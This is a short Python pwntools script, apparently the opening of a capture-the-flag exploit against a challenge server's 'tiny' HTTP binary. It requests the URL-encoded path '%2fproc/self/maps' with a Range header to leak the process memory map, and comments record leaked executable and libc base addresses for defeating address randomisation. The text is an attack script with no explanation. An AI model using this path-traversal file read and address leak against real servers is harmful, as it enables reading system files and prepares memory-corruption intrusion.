from pwn import *
import requests
from urllib.parse import quote

exe = context.binary = ELF("./tiny")

def get_header(file):
    header = {"Range" : "bytes=0-4096"}
    r = requests.get(f"http://tiny.chal.cubectf.com:9999/{file}",headers=header)
    print(f"http://tiny.chal.cubectf.com:9999/{file}")
    return r.text

maps = get_header("%2fproc/self/maps")
print(maps)
# exe.address = 0x55ec5c184000
# libc.address = 0x7f3cdc062000